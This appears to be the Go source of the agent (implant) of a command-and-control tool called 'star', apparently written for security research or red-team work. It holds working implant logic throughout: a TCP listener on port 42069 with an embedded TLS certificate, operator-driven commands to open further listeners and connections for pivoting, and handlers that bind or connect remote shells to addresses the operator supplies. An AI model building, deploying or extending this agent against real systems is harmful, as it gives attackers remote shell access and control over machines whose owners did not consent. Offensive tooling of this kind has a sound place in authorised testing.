package main

import (
	"bytes"
	"embed"
	"encoding/gob"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/CyberSecurityN00b/star/pkg/star"
)

//go:embed connection.crt connection.key
var fs embed.FS

func main() {
	initAgent()
	star.ParameterHandling()

	// SECURITY RESEARCHER TODO: Configure default connections here
	star.NewTCPListener(":42069")

	// Send a "hello" message to any existing connections
	helloMsg := star.NewMessageHello()
	helloMsg.Send(star.ConnectID{})

	exitSignal := make(chan os.Signal)
	signal.Notify(exitSignal, syscall.SIGINT, syscall.SIGTERM)
	es := <-exitSignal

	//Let the terminal know we closed due to a signal
	errMsg := star.NewMessageError(star.MessageErrorResponseTypeAgentExitSignal, fmt.Sprintf("%b", es))
	errMsg.Send(star.ConnectID{})

	//Handle termination
	// TODO: change false to true when "done" with development
	termMsg := star.NewMessageTerminate(star.MessageTerminateTypeAgent, 0)
	star.ThisNode.MessageProcessor(termMsg)
}

///////////////////////////////////////////////////////////////////////////////

func initAgent() {
	star.STARCoreSetup()
	star.ThisNode = star.NewNode(star.NodeTypeAgent)
	star.ThisNode.MessageProcessor = AgentProcessMessage

	star.ThisNodeInfo.Setup()

	// Setup connection cert
	conncrt, err := fs.ReadFile("connection.crt")
	if err != nil {
		print(err)
		os.Exit(1)
	}
	connkey, err := fs.ReadFile("connection.key")
	if err != nil {
		print(err)
		os.Exit(1)
	}
	err = star.SetupConnectionCertificate(conncrt, connkey)
	if err != nil {
		print(err)
		os.Exit(1)
	}
}

///////////////////////////////////////////////////////////////////////////////

func AgentProcessMessage(msg *star.Message) {
	switch msg.Type {
	case star.MessageTypeBind:
		AgentProcessBind(msg)
	case star.MessageTypeConnect:
		AgentProcessConnect(msg)
	case star.MessageTypeKillSwitch:
		AgentProcessKillSwitch(msg)
	case star.MessageTypeSyncRequest:
		AgentProcessSyncRequest(msg)
	case star.MessageTypeTerminate:
		AgentProcessTerminateRequest(msg)
	case star.MessageTypeShellBind:
		AgentProcessShellBindRequest(msg)
	case star.MessageTypeShellConnection:
		AgentProcessShellConnectionRequest(msg)
	case star.MessageTypeFileServer:
		AgentProcessFileServerRequest(msg)
	}
}

func AgentProcessBind(msg *star.Message) {
	var reqMsg star.MessageBindRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		switch reqMsg.Type {
		case star.ConnectorTypeTCP:
			var address string
			var b bytes.Buffer

			b.Write(reqMsg.Data)
			err := gob.NewDecoder(&b).Decode(&address)
			if err == nil {
				star.NewTCPListener(address)
			} else {
				errMsg := star.NewMessageError(star.MessageErrorResponseTypeGobDecodeError, fmt.Sprintf("%d->%d", msg.Type, reqMsg.Type))
				errMsg.Destination = msg.Source
				errMsg.Send(star.ConnectID{})
			}
		}
	}
}

func AgentProcessConnect(msg *star.Message) {
	var reqMsg star.MessageConnectRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		switch reqMsg.Type {
		case star.ConnectorTypeTCP:
			var address string
			var b bytes.Buffer

			b.Write(reqMsg.Data)
			err := gob.NewDecoder(&b).Decode(&address)
			if err == nil {
				star.NewTCPConnection(address)
			} else {
				errMsg := star.NewMessageError(star.MessageErrorResponseTypeGobDecodeError, fmt.Sprintf("%d->%d", msg.Type, reqMsg.Type))
				errMsg.Destination = msg.Source
				errMsg.Send(star.ConnectID{})
			}
		default:
			errMsg := star.NewMessageError(star.MessageErrorResponseTypeUnsupportedConnectorType, fmt.Sprintf("%d->%d", msg.Type, reqMsg.Type))
			errMsg.Destination = msg.Source
			errMsg.Send(star.ConnectID{})
		}
	}
}

func AgentProcessKillSwitch(msg *star.Message) {
	var reqMsg star.MessageKillSwitchRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		// TODO: Cleanup
		os.Exit(1)
	}
}

func AgentProcessSyncRequest(msg *star.Message) {
	var reqMsg star.MessageSyncRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		syncMsg := star.NewMessageSyncResponse()
		syncMsg.Destination = msg.Source
		syncMsg.Send(star.ConnectID{})
	}
}

func AgentProcessTerminateRequest(msg *star.Message) {
	var reqMsg star.MessageTerminateRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		invalid := false
		switch reqMsg.Type {
		case star.MessageTerminateTypeAgent:
			os.Exit(1)
		case star.MessageTerminateTypeConnection:
			id, ok := star.ThisNodeInfo.ConnectionIDs[reqMsg.Index]
			if !ok {
				invalid = true
			} else {
				conn, ok := star.GetConnection(id)
				if !ok {
					invalid = true
				} else {
					conn.Close()
					star.ThisNodeInfo.RemoveConnector(id)
				}
			}
		case star.MessageTerminateTypeListener:
			id, ok := star.ThisNodeInfo.ListenerIDs[reqMsg.Index]
			if !ok {
				invalid = true
			} else {
				listener, ok := star.GetListener(id)
				if !ok {
					invalid = true
				} else {
					listener.Close()
					star.ThisNodeInfo.RemoveListener(id)
				}
			}
		case star.MessageTerminateTypeStream:
			stream, ok := star.GetActiveStream(star.ThisNodeInfo.StreamIDs[reqMsg.Index])
			if !ok {
				invalid = true
			} else {
				stream.Close()
			}
		default:
			errMsg := star.NewMessageError(star.MessageErrorResponseTypeUnsupportedTerminationType, fmt.Sprintf("%d", reqMsg.Type))
			errMsg.Destination = msg.Source
			errMsg.Send(star.ConnectID{})
		}

		if invalid {
			errMsg := star.NewMessageError(star.MessageErrorResponseTypeInvalidTerminationIndex, fmt.Sprintf("%d->%d", reqMsg.Type, reqMsg.Index))
			errMsg.Destination = msg.Source
			errMsg.Send(star.ConnectID{})
		}
	}
	syncMsg := star.NewMessageSyncResponse()
	syncMsg.Send(star.ConnectID{})
}

func AgentProcessShellBindRequest(msg *star.Message) {
	var reqMsg star.MessageShellBindRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		star.NewShellListener(reqMsg.Address, reqMsg.Type, reqMsg.Requester)
	}
}

func AgentProcessShellConnectionRequest(msg *star.Message) {
	var reqMsg star.MessageShellConnectionRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		star.NewShellConnection(reqMsg.Address, reqMsg.Type, reqMsg.Requester)
	}
}

func AgentProcessFileServerRequest(msg *star.Message) {
	var reqMsg star.MessageFileServerRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {

	}
}

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
